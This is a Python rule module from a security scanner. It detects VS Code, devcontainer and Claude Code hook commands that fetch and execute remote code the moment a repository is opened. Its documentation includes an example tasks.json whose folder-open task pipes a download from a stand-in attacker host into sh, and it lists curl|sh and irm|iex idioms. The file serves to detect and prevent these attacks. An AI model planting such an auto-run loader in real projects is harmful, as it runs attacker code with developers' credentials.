"""DEV-004, auto-run command fetches and executes remote code.

The worm / loader shape: a developer-environment command that runs the
moment the repo is opened (a VS Code folder-open task, a devcontainer
lifecycle / initialize command, or a Claude Code hook) and pipes a
remote download straight into an interpreter (``curl … | sh``,
``iwr … | iex``, ``bash -c "$(curl …)"``). The attacker controls the
fetched content, so opening the checkout runs arbitrary attacker code
with no review step in between. This is the second stage the 2026
Red Hat npm compromise dropped (editor / devcontainer loaders that
fire on open).

CRITICAL: combines a confirmed auto-execution trigger with
attacker-controllable code. Reuses the cross-provider
``_primitives.remote_script_exec`` detector so the idiom catalog stays
aligned with GHA-016 / GCB-010 and friends, but scopes the scan to the
auto-run command strings only (not arbitrary config text) to keep the
false-positive rate near zero.
"""
from __future__ import annotations

from ..._primitives import remote_script_exec
from ...base import Finding, Severity
from ...rule import Rule
from ..base import (
    KIND_CLAUDE_SETTINGS,
    KIND_DEVCONTAINER,
    KIND_VSCODE_TASKS,
    WorkspaceFile,
    claude_command_hooks,
    devcontainer_initialize_commands,
    devcontainer_lifecycle_commands,
    location_for,
    vscode_folderopen_tasks,
)

RULE = Rule(
    id="DEV-004",
    title="Auto-run command fetches and executes remote code",
    severity=Severity.CRITICAL,
    owasp=("CICD-SEC-3", "CICD-SEC-4"),
    esf=("ESF-S-VERIFY-DEPS",),
    cwe=("CWE-494",),
    recommendation=(
        "Remove the network fetch from any command that runs on repo "
        "open. Vendor the script into the repository and invoke the "
        "checked-in copy, or download to a file and verify a pinned "
        "sha256 before executing. A ``curl | sh`` that runs the instant "
        "the repo is opened is arbitrary remote code execution on the "
        "developer's machine."
    ),
    docs_note=(
        "Fires when a command on an auto-execution surface "
        "(VS Code ``folderOpen`` task, devcontainer lifecycle / "
        "``initializeCommand``, or a Claude Code ``command`` hook) matches "
        "the remote-fetch-to-interpreter idiom catalog "
        "(``curl|bash``, ``wget|sh``, ``bash -c \"$(curl …)\"``, "
        "PowerShell ``irm|iex``, …). Scoped to the auto-run command "
        "strings, so an unrelated URL elsewhere in the config does not "
        "trigger it. Vendor-trusted installer hosts are still flagged "
        "(the auto-run-on-open context makes them risky) but carry a "
        "``vendor_trusted`` marker in the detector output."
    ),
    incident_refs=(
        "Red Hat npm compromise second-stage loaders (BoostSecurity, "
        '"Trusted Publishing, Untrusted Branch", 2026): editor / '
        "devcontainer / agent configs that fetch-and-run on repo open.",
    ),
    exploit_example=(
        "# .vscode/tasks.json — runs on folder open, fetches + executes\n"
        "{\n"
        '  "version": "2.0.0",\n'
        '  "tasks": [\n'
        '    { "label": "setup", "type": "shell",\n'
        '      "command": "curl -fsSL https://evil.example/loader.sh | sh",\n'
        '      "runOptions": { "runOn": "folderOpen" } }\n'
        "  ]\n"
        "}\n"
        "\n"
        "# The reviewer opens the PR's checkout in VS Code, trusts the\n"
        "# workspace, and the loader runs with their local credentials\n"
        "# before they read a single line of the diff."
    ),
)


def _auto_run_commands(wf: WorkspaceFile) -> list[str]:
    """Every command string that executes when this file's repo opens."""
    if wf.kind == KIND_VSCODE_TASKS:
        return [c for _, c in vscode_folderopen_tasks(wf.data) if c]
    if wf.kind == KIND_DEVCONTAINER:
        cmds = [c for _, c in devcontainer_lifecycle_commands(wf.data) if c]
        cmds += [c for c in devcontainer_initialize_commands(wf.data) if c]
        return cmds
    if wf.kind == KIND_CLAUDE_SETTINGS:
        return [c for _, c in claude_command_hooks(wf.data) if c]
    return []


def check(path: str, wf: WorkspaceFile) -> Finding:
    commands = _auto_run_commands(wf)
    hits = []
    culprit = ""
    for cmd in commands:
        found = remote_script_exec.scan(cmd)
        if found and not culprit:
            culprit = cmd
        hits.extend(found)
    passed = not hits
    if passed:
        desc = "No auto-run command fetches and executes remote code."
    else:
        snippets = sorted({h.snippet for h in hits})[:3]
        more = "…" if len({h.snippet for h in hits}) > 3 else ""
        desc = (
            f"{len(hits)} auto-run command(s) fetch and execute remote "
            f"code: {', '.join(snippets)}{more}. This runs the moment the "
            "repo is opened."
        )
    return Finding(
        check_id=RULE.id, title=RULE.title, severity=RULE.severity,
        resource=path, description=desc,
        recommendation=RULE.recommendation, passed=passed,
        locations=location_for(path, wf.raw, culprit) if not passed else [],
    )
